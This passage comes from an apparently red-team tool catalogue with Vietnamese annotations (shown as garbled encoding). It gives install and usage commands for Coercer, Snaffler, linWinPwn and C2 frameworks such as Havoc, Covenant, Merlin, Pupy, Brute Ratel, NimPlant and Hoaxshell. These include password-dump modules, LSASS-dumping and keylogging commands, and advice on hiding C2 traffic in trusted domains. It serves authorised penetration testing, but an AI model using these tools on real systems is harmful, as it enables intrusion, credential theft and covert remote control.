**LÆ°u Ã½:** Sá»­ dá»¥ng **script Python Coercer.py** vá»›i cÃ¡c cháº¿ Ä‘á»™ (`scan`, `coerce`, `fuzz`). `-t` lÃ  mÃ¡y chá»§ Windows má»¥c tiÃªu, `-l` lÃ  Ä‘á»‹a chá»‰ IP cá»§a listener cá»§a attacker (nÆ¡i **Responder** hoáº·c cÃ´ng cá»¥ relay NTLM Ä‘ang cháº¡y). `-u`, `-p`, `-d` lÃ  thÃ´ng tin xÃ¡c thá»±c Ä‘á»ƒ káº¿t ná»‘i ban Ä‘áº§u (cÃ³ thá»ƒ khÃ´ng cáº§n thiáº¿t cho má»™t sá»‘ ká»¹ thuáº­t). `coerce` mode gá»i cÃ¡c hÃ m **RPC** trÃªn mÃ¡y má»¥c tiÃªu Ä‘á»ƒ buá»™c nÃ³ khá»Ÿi táº¡o má»™t káº¿t ná»‘i **SMB/RPC** ngÆ°á»£c vá» mÃ¡y cá»§a attacker, nÆ¡i thÃ´ng tin xÃ¡c thá»±c **NTLM hash** (cá»§a tÃ i khoáº£n dá»‹ch vá»¥ hoáº·c mÃ¡y tÃ­nh) cÃ³ thá»ƒ bá»‹ báº¯t vÃ /hoáº·c relay (vÃ­ dá»¥: NTLM relay attack).

![image](https://user-images.githubusercontent.com/100603074/216737001-3195a6c4-3d41-431d-88ce-ed35ed474d33.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/p0dalirius/Coercer#quick-start*

**Collection**
====================

### [ğŸ”™](#tool-list)[**BloodHound**](https://github.com/BloodHoundAD/BloodHound)

An application used to visualize **active directory environments**. A quick way to visualise **attack paths** and understand victims' **active directory properties**.

**Install:** [PenTestPartners Walkthrough](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/)
**LÆ°u Ã½:** **BloodHound** cÃ³ cáº£ client (UI) vÃ  server (database graph). ThÆ°á»ng cáº§n cÃ i Ä‘áº·t cáº£ hai. Wiki hoáº·c cÃ¡c hÆ°á»›ng dáº«n cÃ i Ä‘áº·t chuyÃªn sÃ¢u cung cáº¥p cÃ¡c bÆ°á»›c cá»¥ thá»ƒ (Docker, Neo4j, cÃ¡ch cháº¡y ingestor...).

**Custom Queries:** [CompassSecurity BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries)
**LÆ°u Ã½:** CÃ¡c truy váº¥n tÃ¹y chá»‰nh cho **BloodHound** giÃºp tÃ¬m kiáº¿m cÃ¡c **attack path** phá»©c táº¡p hoáº·c cá»¥ thá»ƒ trong Ä‘á»“ thá»‹ AD.

![image](https://user-images.githubusercontent.com/100603074/206549387-a63e5f0e-aa75-47f6-b51a-942434648ee2.png)

### [ğŸ”™](#tool-list)[**Snaffler**](https://github.com/SnaffCon/Snaffler)

**Snaffler** is an advanced **credential scanner/collector** for **Active Directory** environments. *With a great [README](https://github.com/SnaffCon/Snaffler/blob/master/README.md)*.

**Snaffler** uses a system of "classifiers", each of which examine shares or folders or files or file contents, passing some items downstream to the next classifier, and discarding others. Each classifier uses a set of rules to decide what to do with the items it classifies.

*More information about **Snaffler** [rules](https://github.com/SnaffCon/Snaffler#i-am-a-mighty-titan-of-tedium-a-master-of-the-mundane-i-wish-to-write-my-own-ruleset).*

'*Broadly speaking - it gets a list of **Windows computers** from **Active Directory**, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.*' - Snaffler README (2023)
**LÆ°u Ã½:** **Snaffler** táº­p trung vÃ o viá»‡c quÃ©t cÃ¡c file share vÃ  ná»™i dung file trÃªn nhiá»u mÃ¡y tÃ­nh **Windows** trong má»™t domain Ä‘á»ƒ tÃ¬m thÃ´ng tin nháº¡y cáº£m.

**Install:**

You can download the binary from the [GitHub Releases Page](https://github.com/SnaffCon/Snaffler/releases).
**LÆ°u Ã½:** Táº£i xuá»‘ng file `.exe` Ä‘Ã£ biÃªn dá»‹ch sáºµn.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Targeted local scan (less likely to trigger detections)
Snaffler.exe -s -i C:\

# Go in loud and find everything
snaffler.exe -s -o snaffler.log
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **cÃ´ng cá»¥ Snaffler.exe** vá»›i cÃ¡c tÃ¹y chá»n. `-s` báº¯t Ä‘áº§u quÃ¡ trÃ¬nh quÃ©t. `-i C:\` quÃ©t cá»¥c bá»™ tá»« á»• C. `-o snaffler.log` xuáº¥t káº¿t quáº£ ra file log. **Snaffler** sá»­ dá»¥ng cÃ¡c bá»™ phÃ¢n loáº¡i (classifiers) vÃ  luáº­t (`rules`) Ä‘á»ƒ tÃ¬m kiáº¿m. Cháº¡y á»Ÿ cháº¿ Ä‘á»™ "loud" cÃ³ thá»ƒ táº¡o ra nhiá»u lÆ°u lÆ°á»£ng máº¡ng vÃ  hÃ nh vi Ä‘á»c file, dá»… bá»‹ phÃ¡t hiá»‡n bá»Ÿi cÃ¡c biá»‡n phÃ¡p giÃ¡m sÃ¡t.

![image](https://user-images.githubusercontent.com/100603074/210266420-a658a48e-2945-4d06-9aff-e3fb14664829.png)

*Image used from https://github.com/SnaffCon/Snaffler#what-does-it-look-like*

### [ğŸ”™](#tool-list)[**linWinPwn**](https://github.com/lefayjey/linWinPwn)

**linWinPwn** is a **bash script** that automates a number of **Active Directory Enumeration and Vulnerability** checks.

The script uses a number of tools and serves as wrapper of them. Tools include: **impacket, bloodhound, crackmapexec, enum4linux-ng, ldapdomaindump, lsassy, smbmap, kerbrute, adidnsdump, certipy, silenthound**, and others.

**linWinPwn** is particularly useful when you have access to an **Active Directory** environment for a limited time only, and you wish to automate the enumeration process and collect evidence efficiently.
**LÆ°u Ã½:** **linWinPwn** lÃ  má»™t script tÃ­ch há»£p, tá»± Ä‘á»™ng hÃ³a viá»‡c cháº¡y nhiá»u **cÃ´ng cá»¥** khÃ¡c nhau trong má»™t pipeline Ä‘á»ƒ thu tháº­p thÃ´ng tin vá» AD. Cháº¡y trÃªn **Linux**, nháº¯m má»¥c tiÃªu **Active Directory**.

**Install:**

```bash
git clone https://github.com/lefayjey/linWinPwn
cd linWinPwn; chmod +x linWinPwn.sh
chmod +x install.sh
./install.sh
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **script bash** **linWinPwn** vÃ  cháº¡y **script cÃ i Ä‘áº·t** cá»§a nÃ³, cÃ³ thá»ƒ yÃªu cáº§u **Git** vÃ  cÃ¡c **tool** khÃ¡c (impacket, bloodhound-python, crackmapexec, ...) Ä‘Ã£ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÆ°á»›c.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Default: interactive - Open interactive menu to run checks separately
./linWinPwn.sh -t <Domain_Controller_IP> [-d <AD_domain> -u <AD_user> -p <AD_password_or_hash[LM:NT]_or_kerbticket[./krb5cc_ticket]> -o <output_dir>]

# Auto config - Run NTP sync with target DC and add entry to /etc/hosts before running the modules
./linWinPwn.sh -t <Domain_Controller_IP> --auto-config

# LDAPS - Use LDAPS instead of LDAP (port 636)
./linWinPwn.sh -t <Domain_Controller_IP> --ldaps

# Module pwd_dump: Password Dump
./linWinPwn.sh -t <Domain_Controller_IP> -M pwd_dump [-d <AD_domain> -u <AD_user> -p <AD_password_or_hash[LM:NT]_or_kerbticket[./krb5cc_ticket]> -o <output_dir>]
```
**LÆ°u Ã½:** VÃ­ dá»¥ vá» cÃ¡ch sá»­ dá»¥ng **script linWinPwn.sh**. `-t` chá»‰ Ä‘á»‹nh IP cá»§a **Domain Controller**. CÃ¡c tÃ¹y chá»n khÃ¡c cho phÃ©p cung cáº¥p thÃ´ng tin xÃ¡c thá»±c domain, thÆ° má»¥c output, cháº¿ Ä‘á»™ tÆ°Æ¡ng tÃ¡c hoáº·c tá»± Ä‘á»™ng, sá»­ dá»¥ng LDAPS, hoáº·c chá»‰ cháº¡y má»™t module cá»¥ thá»ƒ (`-M`). Module `pwd_dump` cÃ³ thá»ƒ liÃªn quan Ä‘áº¿n viá»‡c sá»­ dá»¥ng cÃ¡c cÃ´ng cá»¥ nhÆ° **secretsdump** hoáº·c cÃ¡c phÆ°Æ¡ng phÃ¡p khÃ¡c Ä‘á»ƒ **dump hash**.

Full usage information [táº¡i Ä‘Ã¢y](https://github.com/lefayjey/linWinPwn#usage).

![image](https://user-images.githubusercontent.com/100603074/216737032-57ceff01-2606-474d-a745-b39fb4997ea1.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/lefayjey/linWinPwn#demos*

**Command and Control**
====================

### [ğŸ”™](#tool-list)Dá»± Ã¡n "**Living Off Trusted Sites Project**"

**C2** implants can be detected by defenders looking for unusual network traffic to uncommon domains. Additionally proxy solutions can sometimes block connections to untrusted domains.

Being able to hide your **C2 traffic** via a trusted domain will help you to stay undetected and reduce the likelihood of being blocked at the proxy level by security solutions.

This resource contains a list of trusted sites that can be used.
**LÆ°u Ã½:** TÃ i nguyÃªn nÃ y lÃ  má»™t danh sÃ¡ch cÃ¡c **domain/subdomain** cá»§a cÃ¡c dá»‹ch vá»¥ phá»• biáº¿n (vÃ­ dá»¥: Google, Microsoft, Amazon) cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ "áº©n mÃ¬nh" hoáº¡t Ä‘á»™ng C2 báº±ng cÃ¡ch khiáº¿n lÆ°u lÆ°á»£ng Ä‘á»™c háº¡i trÃ´ng giá»‘ng lÆ°u lÆ°á»£ng truy cáº­p há»£p phÃ¡p.

**CÃ¡ch sá»­ dá»¥ng:**

Visit [https://lots-project.com/](https://lots-project.com/)

Search for `+C&C` in the search bar to view all potential domains / subdomains that can be used for **command and control** operations.

Results include:

- raw.githubusercontent.com
- docs.google.com
- *.azurewebsites.net
- dropbox.com
- *.amazonaws.com

![image](https://user-images.githubusercontent.com/100603074/220959716-85a7f403-95af-441b-9cbf-f6c278be6652.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://lots-project.com/*

### [ğŸ”™](#tool-list)[**Havoc**](https://github.com/HavocFramework/Havoc)

**Havoc** is a modern and malleable **post-exploitation command and control framework**, created by [@C5pider](https://twitter.com/C5pider).

Features include: Sleep Obfuscation, x64 return address spoofing, Indirect Syscalls for Nt* APIs

**Pre-requisites:** (Ubuntu 20.04 / 22.04)

```bash
sudo apt install build-essential
sudo add-apt-repository ppa:deadsnakes/ppa
sudo apt update
sudo apt install python3.10 python3.10-dev
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cÃ i Ä‘áº·t cÃ¡c gÃ³i build cáº§n thiáº¿t vÃ  Python 3.10 trÃªn Ubuntu. YÃªu cáº§u quyá»n super user.

**Build + Usage:**

```bash
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc/Client
make
./Havoc
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh Ä‘á»ƒ clone mÃ£ nguá»“n vÃ  build client **Havoc** (GUI). `make` biÃªn dá»‹ch client. Sau Ä‘Ã³ cháº¡y tá»‡p nhá»‹ phÃ¢n **Havoc**.

**Pre-requisites:** (Ubuntu 20.04 / 22.04)

```bash
cd Havoc/Teamserver
go mod download golang.org/x/sys
go mod download github.com/ugorji/go
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh nÃ y táº£i cÃ¡c module Go cáº§n thiáº¿t cho teamserver. YÃªu cáº§u Go vÃ  **Git**.

**Build + Usage:**

```bash
cd Teamserver
./Install.sh
make
./teamserver -h
```
**LÆ°u Ã½:** Cháº¡y script cÃ i Ä‘áº·t (thÃªm tÃ¹y chá»n tÃ¹y theo há»‡ Ä‘iá»u hÃ nh/mong muá»‘n), sau Ä‘Ã³ biÃªn dá»‹ch (`make`) teamserver vÃ  xem trá»£ giÃºp.

**Run the teamserver**

```bash
sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```
**LÆ°u Ã½:** Lá»‡nh cháº¡y teamserver cá»§a **Havoc**. NÃ³ láº¯ng nghe cÃ¡c káº¿t ná»‘i tá»« agent vÃ  xá»­ lÃ½ chÃºng. `-v` vÃ  `--debug` báº­t cháº¿ Ä‘á»™ chi tiáº¿t Ä‘á»ƒ debug. Cáº§n quyá»n `sudo` Ä‘á»ƒ láº¯ng nghe trÃªn cÃ¡c cá»•ng dÆ°á»›i 1024 náº¿u profile cáº¥u hÃ¬nh nhÆ° váº­y. `--profile` chá»‰ Ä‘á»‹nh tá»‡p cáº¥u hÃ¬nh (thÆ°á»ng lÃ  Ä‘á»‹nh dáº¡ng **YAML/YAOTL**) chá»©a cÃ¡c chi tiáº¿t nhÆ° host, cá»•ng, ká»¹ thuáº­t che giáº¥u,...

*Full install, build and run instructions on the [wiki](https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD)*

![image](https://user-images.githubusercontent.com/100603074/206025215-9c7093e5-b45a-4755-81e6-9e2a52a1f455.png)

### [ğŸ”™](#tool-list)[**Covenant**](https://github.com/cobbr/Covenant)

**Covenant** is a **.NET command and control framework**, it has a web interface that allows for multi-user collaboration.

It can be used to remotely control compromised systems and perform a variety of different tasks, including executing arbitrary code, moving laterally through a network, and exfiltrating data, and more.

**Install (Dotnet Core):**

You can download **dotnet core** for your platform from [táº¡i Ä‘Ã¢y](https://dotnet.microsoft.com/download/dotnet-core/3.1).

**Note:** *After starting **Covenant**, you must register an initial user through the web interface. Navigating to the web interface will allow you to register the initial user*
**LÆ°u Ã½:** **Covenant** lÃ  má»™t á»©ng dá»¥ng .NET Core, cháº¡y cross-platform nhÆ°ng yÃªu cáº§u .NET Core Runtime. NÃ³ cÃ³ giao diá»‡n web Ä‘á»ƒ quáº£n lÃ½ C2.

```bash
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
```
**LÆ°u Ã½:** Clone mÃ£ nguá»“n **Covenant** vÃ  cáº£ cÃ¡c submodule cá»§a nÃ³.

**CÃ¡ch sá»­ dá»¥ng (Dotnet Core):**

```bash
~/Covenant/Covenant > dotnet run
warn: Microsoft.EntityFrameworkCore.Model.Validation[10400]
      Sensitive data logging is enabled. Log entries and exception messages may include sensitive application data, this mode should only be enabled during development.
WARNING: Running Covenant non-elevated. You may not have permission to start Listeners on low-numbered ports. Consider running Covenant elevated.
Covenant has started! Navigate to https://127.0.0.1:7443 in a browser
```
**LÆ°u Ã½:** Lá»‡nh `dotnet run` biÃªn dá»‹ch vÃ  cháº¡y dá»± Ã¡n Covenant. Output cho tháº¥y nÃ³ khá»Ÿi Ä‘á»™ng server web trÃªn cá»•ng 7443. NÃ³ cáº£nh bÃ¡o náº¿u khÃ´ng cháº¡y vá»›i quyá»n nÃ¢ng cao (cÃ³ thá»ƒ khÃ´ng thá»ƒ láº¯ng nghe trÃªn cÃ¡c cá»•ng Ä‘áº·c quyá»n).

**Install (Docker):**

```bash
# Build the docker image:
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
~/Covenant/Covenant > docker build -t covenant .
```
**LÆ°u Ã½:** BiÃªn dá»‹ch **Covenant** vÃ o má»™t Docker image.

**CÃ¡ch sá»­ dá»¥ng (Docker):**

```bash
# Run Covenant within the Docker container
~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v </absolute/path/to/Covenant/Covenant/Data>:/app/Data covenant

# Stop the container
~/Covenant/Covenant > docker stop covenant

# Restart Covenant interactively
~/Covenant/Covenant > docker start covenant -ai
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh Docker Ä‘á»ƒ cháº¡y container Covenant, Ã¡nh xáº¡ cÃ¡c cá»•ng tá»« container ra mÃ¡y host (`-p`) vÃ  mount volume Ä‘á»ƒ lÆ°u trá»¯ dá»¯ liá»‡u C2 bÃªn ngoÃ i container (`-v`). Cháº¡y `stop` vÃ  `start` container.

Full installation and startup instructions can be found on the wiki [táº¡i Ä‘Ã¢y](https://github.com/cobbr/Covenant/wiki/Installation-And-Startup).

![image](https://user-images.githubusercontent.com/100603074/210168138-58473fc0-4361-41ec-9439-2f2fcb159520.png)

*Image from https://github.com/cobbr/Covenant*

### [ğŸ”™](#tool-list)[**Merlin**](https://github.com/Ne0nd0g/merlin)

**Merlin** is an open-source **post-exploitation framework** that is designed to be used after a initial compromise of a system.

It is written in **Python** and can be used to perform a variety of different tasks, such as executing arbitrary code, moving laterally through a network, and exfiltrating data.
**LÆ°u Ã½:** CÃ³ váº» thÃ´ng tin mÃ´ táº£ nÃ y chÆ°a Ä‘Æ°á»£c cáº­p nháº­t, Merlin lÃ  framework **Golang** chá»© khÃ´ng pháº£i Python nhÆ° miÃªu táº£ cÅ© nÃ y. ThÃ´ng tin á»Ÿ pháº§n sau (yÃªu cáº§u Go) xÃ¡c nháº­n Ä‘iá»u nÃ y.

**Install:**

1. Download the latest compiled version of **Merlin Server** from the [releases](https://github.com/Ne0nd0g/merlin/releases) section
2. Extract the files with 7zip using the x function The password is: merlin
3. Start Merlin
4. Configure a [listener](https://merlin-c2.readthedocs.io/en/latest/server/menu/listeners.html)
5. Deploy an agent. See [Agent Execution Quick Start Guide](https://merlin-c2.readthedocs.io/en/latest/quickStart/agent.html) for examples

```bash
mkdir /opt/merlin;cd /opt/merlin
wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
7z x merlinServer-Linux-x64.7z
sudo ./merlinServer-Linux-x64
```
**LÆ°u Ã½:** Táº£i xuá»‘ng vÃ  giáº£i nÃ©n tá»‡p **Merlin Server** Ä‘Ã£ Ä‘Æ°á»£c biÃªn dá»‹ch sáºµn cho Linux x64, sau Ä‘Ã³ cháº¡y nÃ³. ThÆ°á»ng cáº§n quyá»n `sudo` Ä‘á»ƒ cháº¡y server náº¿u nÃ³ sá»­ dá»¥ng cá»•ng Ä‘áº·c quyá»n.

**CÃ¡ch sá»­ dá»¥ng:**

1. Ensure the **Merlin server** is running with a configured listener
2. Download and deploy an agent to the victim
3. Execute agent
**LÆ°u Ã½:** Sau khi server cháº¡y, báº¡n táº¡o cÃ¡c listener, generate agent binary (sá»­ dá»¥ng server), Ä‘Æ°a agent lÃªn mÃ¡y náº¡n nhÃ¢n vÃ  thá»±c thi. Agent káº¿t ná»‘i ngÆ°á»£c vá» server Ä‘á»ƒ nháº­n lá»‡nh.

For detailed usage information see the official Merlin [wiki](https://merlin-c2.readthedocs.io/en/latest/server/menu/main.html).

![image](https://user-images.githubusercontent.com/100603074/210168329-57c77e4f-213c-4402-8dd8-70ac3bcabcfe.png)

*Image from https://www.foregenix.com/blog/a-first-look-at-todays-command-and-control-frameworks*

### [ğŸ”™](#tool-list)[**Metasploit Framework**](https://github.com/rapid7/metasploit-framework)

**Metasploit** is an open-source framework for developing, testing, and using exploit code.

The **Metasploit framework** includes a large number of pre-built exploits and payloads, as well as a fully-featured integrated development environment (**IDE**) for creating and testing custom exploits.

**Install (Installer):**

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```
**LÆ°u Ã½:** Táº£i xuá»‘ng **script cÃ i Ä‘áº·t Metasploit** chÃ­nh thá»©c báº±ng `curl`, cáº¥p quyá»n thá»±c thi, vÃ  cháº¡y nÃ³. PhÆ°Æ¡ng phÃ¡p cÃ i Ä‘áº·t Ä‘Æ°á»£c Ä‘á» xuáº¥t trÃªn cÃ¡c há»‡ thá»‘ng **Linux**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
/opt/metasploit-framework/bin/msfconsole
```
**LÆ°u Ã½:** Lá»‡nh cháº¡y **console** chÃ­nh cá»§a **Metasploit**, nÆ¡i báº¡n tÆ°Æ¡ng tÃ¡c vá»›i framework. ThÆ°á»ng Ä‘Æ°á»£c tÃ¬m tháº¥y trong thÆ° má»¥c `/opt/metasploit-framework`.

Full installation instructions can be found on the official [wiki](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html).

[Rapid7 **Metasploit** blogs](https://www.rapid7.com/blog/tag/metasploit/)

[Cheat sheet graphic](https://cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet.webp)

[Nice command list](https://github.com/security-cheatsheet/metasploit-cheat-sheet)

![image](https://user-images.githubusercontent.com/100603074/210168463-f1ac1edb-2f0e-4008-a8ba-308f3a741a9e.png)

*Image used from https://goacademy.io/how-to-install-metasploit-on-kali-linux/*

### [ğŸ”™](#tool-list)[**Pupy**](https://github.com/n1nj4sec/pupy)

**Pupy** is an opensource, cross-platform (**Windows, Linux, OSX, Android**) **C2** and **post-exploitation framework** written in python and C.

It allows an attacker to remotely control a victim's computer and execute various actions, such as command execution, key logging, and taking screen shots.

**Install (Git):**

```bash
sudo apt install git libssl1.0-dev libffi-dev python-dev python-pip build-essential swig tcpdump python-virtualenv
git clone --recursive https://github.com/n1nj4sec/pupy
cd pupy
python create-workspace.py -DG pupyw
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t cÃ¡c dependency (bao gá»“m cáº£ thÆ° viá»‡n Python, cÃ´ng cá»¥ build, tcpdump...) vÃ  sau Ä‘Ã³ clone mÃ£ nguá»“n cá»§a **Pupy** (bao gá»“m cáº£ submodule). Cuá»‘i cÃ¹ng cháº¡y script Ä‘á»ƒ táº¡o khÃ´ng gian lÃ m viá»‡c cho Pupy. Cáº§n quyá»n `sudo` Ä‘á»ƒ cÃ i Ä‘áº·t cÃ¡c gÃ³i há»‡ thá»‘ng.

Roll fix to fix the error:

```bash
sudo pip2 install rpyc==3.4.4
```
**LÆ°u Ã½:** Lá»‡nh sá»­a lá»—i dependency cá»¥ thá»ƒ nÃ y cÃ i Ä‘áº·t má»™t phiÃªn báº£n `rpyc` cho **Python 2**. CÃ³ váº» nhÆ° pháº§n hÆ°á»›ng dáº«n cÃ i Ä‘áº·t gá»‘c cÃ³ thá»ƒ hÆ¡i lá»—i thá»i hoáº·c dá»±a trÃªn mÃ´i trÆ°á»ng cá»¥ thá»ƒ. Pupy cÃ³ thá»ƒ cáº§n Python 2 cho má»™t sá»‘ pháº§n.

Start:

```bash
export PATH=$PATH:~/.local/bin; pupysh
pupyws/bin/pupysh
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh khá»Ÿi Ä‘á»™ng **console Pupy** (`pupysh`) sau khi Ä‘Ã£ cáº¥u hÃ¬nh khÃ´ng gian lÃ m viá»‡c.

*Git install instructions used from [táº¡i Ä‘Ã¢y](https://kalitut.com/how-to-install-pupy/).*

**Install (Docker):**

For detailed docker and **pupy** installation instructions see the [wiki](https://github.com/n1nj4sec/pupy/wiki/Installation).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Get help page for any builtin commands with -h
>> sessions -h
>> jobs -h
>> run -h

# Interact with session 1
>> sessions -i 1

# Run local command 'ls'
>> !ls
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh Ä‘Æ°á»£c sá»­ dá»¥ng trong **console Pupy** (Ä‘Æ°á»£c biá»ƒu thá»‹ báº±ng `>>`). Báº¡n cÃ³ thá»ƒ dÃ¹ng `-h` cho báº¥t ká»³ lá»‡nh nÃ o Ä‘á»ƒ xem trá»£ giÃºp, tÆ°Æ¡ng tÃ¡c vá»›i cÃ¡c phiÃªn (`sessions -i 1`), hoáº·c cháº¡y lá»‡nh cá»¥c bá»™ trÃªn mÃ¡y attacker báº±ng cÃ¡ch thÃªm `!` phÃ­a trÆ°á»›c (`!ls`).

Full usage information can be found on the [wiki](https://github.com/n1nj4sec/pupy/wiki/Basic-Usage).

The wiki contains good [post exploitation information](https://github.com/n1nj4sec/pupy/wiki/Post-Exploitation).

![image](https://user-images.githubusercontent.com/100603074/210181480-d1ad1bd8-fa8d-4014-842c-3efbb35b2644.png)

*Image used from https://github.com/n1nj4sec/pupy/wiki/Screenshots*

### [ğŸ”™](#tool-list)[**Brute Ratel**](https://bruteratel.com/)

**BruteRatel** is a great **command and control (C4)** framework created by [@NinjaParanoid](https://twitter.com/NinjaParanoid). The framework consists of a client component 'badger' that is installed on the compromised system, and a server component 'commander' that is run by the **red team**.

The client and server communicate with each other using various communication channels, such as HTTP, DNS, or TCP, and can be configured to use different encoding and encryption methods to evade detection.

Some nice features:

- DNS Over HTTPS
- Indirect Syscalls
- Built-in Debugger To Detect **EDR Userland Hooks**
- MITRE graph integration
- Adversary **TTP automation**

**Install:**

To legally get access to the framework you will need to buy a licence (1 Year $2500 per user). See the [pricing page](https://bruteratel.com/pricing/) for more information.
**LÆ°u Ã½:** **Brute Ratel** lÃ  má»™t **framework C2 thÆ°Æ¡ng máº¡i**, khÃ´ng miá»…n phÃ­ hoáº·c mÃ£ nguá»“n má»Ÿ.

After purchase you can download the framework from [táº¡i Ä‘Ã¢y](https://bruteratel.com/tabs/download/) with your Activation Key and License User ID.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Loads a powershell script to memory which can be Invoked using psreflect
psimport

# Locks keyboard and mouse hardware input. Use â€˜unlock_inputâ€™ command to unlock
lock_input

# Dumps user clipboard
dumpclip

# Enumerates basic domain information
dcenum

# Elevates user privileges to SYSTEM (Requires admin rights)
get_system

# Takes a screenshot of current desktop and stores it on the server
screenshot

# Dumps LSASS to C:\Windows\Memory.DMP using the PssCaptureSnapshot technique
shadowclone
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh vÃ­ dá»¥ Ä‘Æ°á»£c sá»­ dá»¥ng *bÃªn trong console Brute Ratel*. Má»—i lá»‡nh thá»±c hiá»‡n má»™t tÃ¡c vá»¥ háº­u khai thÃ¡c khÃ¡c nhau thÃ´ng qua agent (`badger`) cháº¡y trÃªn mÃ¡y náº¡n nhÃ¢n. ÄÃ¢y chá»‰ lÃ  má»™t pháº§n nhá» cÃ¡c lá»‡nh cÃ³ sáºµn.

Full commander terminal usage information can be found [táº¡i Ä‘Ã¢y](https://bruteratel.com/tabs/badger/badgers/).

![image](https://user-images.githubusercontent.com/100603074/210181655-74201cad-a782-43ed-97d3-f4c0926d46c3.png)

*Image used from https://bruteratel.com/*

### [ğŸ”™](#tool-list)[**NimPlant**](https://github.com/chvancooten/NimPlant)

A light-weight **first-stage C2 implant** written in **Nim**.

Features:

- Lightweight and configurable implant written in the **Nim programming language**
- Encryption and compression of all traffic by default, obfuscates static strings in implant artefacts
- Support for several implant types, including native binaries (**exe/dll**), **shellcode** or self-deleting executables
- Easy deployment of more advanced functionality or **payloads** via `inline-execute`, `shinject` (using dynamic invocation), or in-thread `execute-assembly`
- Comprehensive logging of all interactions and file operations

**Install:**

```bash
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
choosenim stable
git clone https://github.com/chvancooten/NimPlant
cd client
nimble install -d
pip3 install -r server/requirements.txt
apt install mingw-w64
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cÃ i Ä‘áº·t ngÃ´n ngá»¯ láº­p trÃ¬nh **Nim** (**choosenim** lÃ  trÃ¬nh quáº£n lÃ½ phiÃªn báº£n Nim), clone mÃ£ nguá»“n **NimPlant**, cÃ i Ä‘áº·t dependency Nim (`nimble`), cÃ i Ä‘áº·t dependency **Python** cho server (`pip3`) vÃ  cÃ i Ä‘áº·t **mingw-w64** Ä‘á»ƒ cross-compile binary **Windows** trÃªn **Linux**. ÄÃ¢y lÃ  quÃ¡ trÃ¬nh cÃ i Ä‘áº·t teamserver/builder cá»§a **NimPlant** trÃªn mÃ¡y attacker.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Generate payloads
python .\NimPlant.py compile all

# Start server
python .\NimPlant.py server
```
**LÆ°u Ã½:** Sá»­ dá»¥ng **script Python NimPlant.py**. Lá»‡nh `compile all` táº¡o cÃ¡c implant/payload khÃ¡c nhau. Lá»‡nh `server` khá»Ÿi Ä‘á»™ng teamserver. Báº¡n cáº§n cáº¥u hÃ¬nh káº¿t ná»‘i giá»¯a implant vÃ  teamserver, cÅ©ng nhÆ° cÃ¡c chi tiáº¿t C2 khÃ¡c.

Before running make sure to create the `config.tool` configuration file, more information can be found [táº¡i Ä‘Ã¢y](https://github.com/chvancooten/NimPlant#getting-started).
**LÆ°u Ã½:** Viá»‡c cáº¥u hÃ¬nh ráº¥t quan trá»ng trÆ°á»›c khi cháº¡y **NimPlant**.

Full usage information can be found [táº¡i Ä‘Ã¢y](https://github.com/chvancooten/NimPlant#usage).

[Blog - Building a C2 Implant in Nim - Considerations and Lessons Learned](https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/)

![image](https://user-images.githubusercontent.com/100603074/220959859-d930b110-c774-4b4c-b004-e4a85a6214ba.png)

*Image used from https://casvancooten.com*

### [ğŸ”™](#tool-list)[**Hoaxshell**](https://github.com/t3l3machus/hoaxshell)

A **Windows reverse shell payload** generator and handler that abuses the http(s) protocol to establish a **beacon-like reverse shell**.
**LÆ°u Ã½:** **Hoaxshell** táº¡o má»™t **reverse shell** hoáº¡t Ä‘á»™ng giá»‘ng **beacon** (káº¿t ná»‘i Ä‘á»‹nh ká»³ vá» attacker) qua HTTP/S. NÃ³ trÃ¡nh sá»­ dá»¥ng cÃ¡c kÃªnh liÃªn láº¡c shell trá»±c tiáº¿p thÆ°á»ng bá»‹ giÃ¡m sÃ¡t cháº·t cháº½ hÆ¡n.

**Install:**

```bash
git clone https://github.com/t3l3machus/hoaxshell
cd ./hoaxshell
sudo pip3 install -r requirements.txt
chmod +x hoaxshell.py
```
**LÆ°u Ã½:** Táº£i mÃ£ nguá»“n, cÃ i dependency Python vÃ  cáº¥p quyá»n thá»±c thi cho **script Python**. Cháº¡y trÃªn há»‡ thá»‘ng **Linux** (mÃ¡y attacker).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
